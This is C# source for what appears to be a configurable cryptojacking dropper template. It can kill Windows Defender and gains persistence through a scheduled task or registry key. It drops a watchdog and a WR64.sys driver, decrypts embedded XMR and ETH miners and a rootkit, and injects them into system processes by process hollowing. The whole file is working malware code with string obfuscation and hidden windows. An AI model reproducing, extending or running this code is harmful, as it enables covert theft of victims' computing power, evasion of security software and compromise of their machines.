using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

#if DefAssembly
[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%v1%" + "." + "%v2%" + "." + "%v3%" + "." + "%v4%")]
#endif

public partial class _rProgram_
{
    public static void Main()
    {
        try
        {
#if DefKillWD
            try
            {
                _rCommand_(_rGetString_("#SCMD"), _rGetString_("#KillWDCommands"), true);
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
            }
#endif
#if DefStartDelay
            Thread.Sleep(startDelay * 1000);
#endif
            string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
            string _rbD2_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#WATCHDOGPATH"));
#if DefInstall
            try
            {
                string _rplp_ = PayloadPath;    
#if DefShellcode
                string _rcmdl_ = Environment.GetCommandLineArgs()[1];
#else
                string _rcmdl_ = Application.ExecutablePath;
#endif
                if (!_rcmdl_.Equals(_rplp_, StringComparison.CurrentCultureIgnoreCase))
                {
#if DefRootkit
                    try
                    {
                        using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESRKI"))))
                        {
                            foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                            {
                                if (_rentry_.FullName.Contains("st"))
                                {
                                    using (var _rstreamdata_ = _rentry_.Open())
                                    {
                                        using (var _rms_ = new MemoryStream())
                                        {
                                            _rstreamdata_.CopyTo(_rms_);
                                            _rRun_(_rms_.ToArray(), Path.Combine(Environment.GetEnvironmentVariable(_rGetString_("#SYSTEMROOT")), _rGetString_("#NSLOOKUP")), null);
                                        }
                                    }
                                }
                            }
                        }  
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("RK: " + ex.ToString());
#endif
                    }
#endif
                    _rFindWatchdog_(true);

                    try{
                        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                        {
                            try{
                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#TASKSCH"), _rplp_));
                            }
                            catch(Exception ex){
#if DefDebug
                                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
#endif
                                _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                            }
                        }else{
                            _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#REGADD"), _rplp_));
                        }
                    }
                    catch(Exception ex){
#if DefDebug
                        MessageBox.Show("M1.5: " + ex.ToString());
#endif
                    }

                    Thread.Sleep(10000);
                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
                    File.Copy(_rcmdl_, _rplp_, true);
                    Thread.Sleep(2 * 1000);
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDSTART"), _rplp_));
                    Environment.Exit(0);
                }
            }
            catch(Exception ex){
#if DefDebug
                MessageBox.Show("M2: " + ex.ToString());
#endif
            }
#endif

            try
            {
                try
                {
                    Directory.CreateDirectory(_rbD_);
                    Directory.CreateDirectory(_rbD2_);
#if DefWatchdog
                    if (!_rFindWatchdog_())
                    {
                        File.WriteAllBytes(_rbD2_ + _rGetString_("#WATCHDOG") + ".exe", _rGetTheResource_("#RESWD"));

                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.Combine(_rbD2_, _rGetString_("#WATCHDOG") + ".exe"),
                            WorkingDirectory = _rbD2_,
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                        });
                    }
#endif
#if DefXMR
                    File.WriteAllBytes(Path.Combine(_rbD_, "WR64.sys"), _rGetTheResource_("#RESWR"));
#endif
                }
                catch (Exception ex)
                {
#if DefDebug
                    MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
#endif
                }

                byte[] _rxmr_ = { };
                byte[] _reth_ = { };

                bool _rGPU_ = _rGetGPU_();

#if DefGPU
                try
                {
                    if (_rGPU_)
                    {
                        try
                        {
                            byte[] _li_ = _rGetTheResource_("#libs");

                            if (_li_.Length > 0) {
                                using (var _rarchive_ = new ZipArchive(new MemoryStream(_li_)))
                                {
                                    foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries){
                                        _rentry_.ExtractToFile(Path.Combine(_rbD_, _rentry_.FullName), true);
                                    }
                                }
                            }
                        }
                        catch(Exception ex){
#if DefDebug
                            MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
                        }
                    }
                }
                catch(Exception ex){
#if DefDebug
                    MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
                }
#endif

                try
                {
#if DefXMR
                    using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESXMR"))))
                    {
                        foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                        {
                            if (_rentry_.FullName.Contains("mr"))
                            {
                                using (var _rstreamdata_ = _rentry_.Open())
                                {
                                    using (var _rms_ = new MemoryStream())
                                    {
                                        _rstreamdata_.CopyTo(_rms_);
                                        _rxmr_ = _rms_.ToArray();
                                    }
                                }
                            }
                        }
                    }
#endif

#if DefETH
                    using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESETH"))))
                    {
                        foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                        {
                            if (_rentry_.FullName.Contains("th"))
                            {
                                using (var _rstreamdata_ = _rentry_.Open())
                                {
                                    using (var _rms_ = new MemoryStream())
                                    {
                                        _rstreamdata_.CopyTo(_rms_);
                                        _reth_ = _rms_.ToArray();
                                    }
                                }
                            }
                        }
                    }
#endif

                    string _rrunningminers_ = _rGetMiners_();

                    string[][] _rminerset_ = new string[][] { MINERSET };

                    foreach (string[] _set_ in _rminerset_)
                    {
                        if (!_rrunningminers_.Contains(_rGetString_(_set_[0])) && (_set_[1] == _rGetString_("#XID") || (_set_[1] == _rGetString_("#EID") && _rGPU_)))
                        {
                            _rRun_((_set_[1] == _rGetString_("#XID") ? _rxmr_ : _reth_), Path.Combine(Environment.GetEnvironmentVariable(_rGetString_(_set_[3])), _rGetString_(_set_[4])), _rGetString_(_set_[2]));
                        }
                    }

                }
                catch (Exception ex)
                {
#if DefDebug
                MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
#endif
                }
            }
            catch (Exception ex)
            {
#if DefDebug
                MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
#endif
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0: " + Environment.NewLine + ex.ToString());
#endif
        }
        Environment.Exit(0);
    }

    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static bool _rGetGPU_()
    {
        try
        {
            string _rarg7_ = "";

            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope(@"\root\cimv2", _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                _rarg7_ += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
            }

            return _rarg7_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg7_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0;
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
        return false;
    }

    public static string _rGetMiners_()
    {
        string _rminers_ = "";

        var _rarg1_ = new ConnectionOptions();
        _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
        var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
        _rarg2_.Connect();

        var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery(_rGetString_("#MINERQUERY"))).Get();
        foreach (ManagementObject MemObj in _rarg3_)
        {
            if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")))
            {
                _rminers_ += MemObj["CommandLine"].ToString();
            }
        }
        return _rminers_;
    }

    public static bool _rFindWatchdog_(bool _rkill_ = false)
    {
#if DefWatchdog
        try
        {
            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOG")))
            {
                proc.Kill();
            }

            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && MemObj["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID")))
                {
                    if(_rkill_){
                        _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                    }else{
                        return true;
                    }
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("KWD: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
        return false;
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_, bool _rwait_ = false)
    {
        try
        {
            var _rproc_ = Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
            if (_rwait_)
            {
                _rproc_.WaitForExit();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV")) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), Encoding.ASCII.GetBytes("#IV"));
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }
            return _rarg7_.ToArray();
        }
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string _rarg1_,
                                             string _rarg2_,
                                             IntPtr _rarg3_,
                                             IntPtr _rarg4_,
                                             bool _rarg5_,
                                             uint _rarg6_,
                                             IntPtr _rarg7_,
                                             string _rarg8_,
                                             byte[] _rarg9_,
                                             byte[] _rarg1_0);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long _rarg1_,
                                              long _rarg2_,
                                              long _rarg3_,
                                              uint _rarg4_,
                                              uint _rarg5_);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long _rarg1_,
                                                  long _rarg2_,
                                                  byte[] _rarg3_,
                                                  int _rarg4_,
                                                  long _rarg5_);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long _rarg1_,
                                                    long _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long _rarg1_,
                                                IntPtr _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long _rarg1_,
                                                IntPtr _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long _rarg1_);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long _rarg1_);

    public static void _rRun_(byte[] _rarg1_, string _rarg2_, string _rarg3_)
    {
        int _rarg4_ = Marshal.ReadInt32(_rarg1_, 0x3c);

        long _rarg5_ = Marshal.ReadInt64(_rarg1_, _rarg4_ + 0x18 + 0x18);

        byte[] _rarg6_ = new byte[0x18];

        IntPtr _rarg7_ = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));

        Marshal.WriteInt32(_rarg7_, 0x30, 0x0010001b);

        CreateProcess(null, _rarg2_ + (!string.IsNullOrEmpty(_rarg3_) ? " " + _rarg3_ : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(_rarg2_), new byte[0x68], _rarg6_);
        long _rarg8_ = Marshal.ReadInt64(_rarg6_, 0x0);
        long _rarg9_ = Marshal.ReadInt64(_rarg6_, 0x8);

        ZwUnmapViewOfSection(_rarg8_, _rarg5_);
        VirtualAllocEx(_rarg8_, _rarg5_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x038), 0x3000, 0x40);
        WriteProcessMemory(_rarg8_, _rarg5_, _rarg1_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x03c), 0L);

        for (short i = 0; i < Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x2); i++)
        {
            byte[] _rarg1_0 = new byte[0x28];
            Buffer.BlockCopy(_rarg1_, _rarg4_ + (0x18 + Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x10)) + (0x28 * i), _rarg1_0, 0, 0x28);

            byte[] _rarg1_1 = new byte[Marshal.ReadInt32(_rarg1_0, 0x010)];
            Buffer.BlockCopy(_rarg1_, Marshal.ReadInt32(_rarg1_0, 0x014), _rarg1_1, 0, _rarg1_1.Length);

            WriteProcessMemory(_rarg8_, _rarg5_ + Marshal.ReadInt32(_rarg1_0, 0x00c), _rarg1_1, _rarg1_1.Length, 0L);
        }

        GetThreadContext(_rarg9_, _rarg7_);

        WriteProcessMemory(_rarg8_, Marshal.ReadInt64(_rarg7_, 0x88) + 16, BitConverter.GetBytes(_rarg5_), 8, 0L);

        Marshal.WriteInt64(_rarg7_, 0x80, _rarg5_ + Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x10));

        SetThreadContext(_rarg9_, _rarg7_);
        ResumeThread(_rarg9_);

        Marshal.FreeHGlobal(_rarg7_);
        CloseHandle(_rarg8_);
        CloseHandle(_rarg9_);
    }
}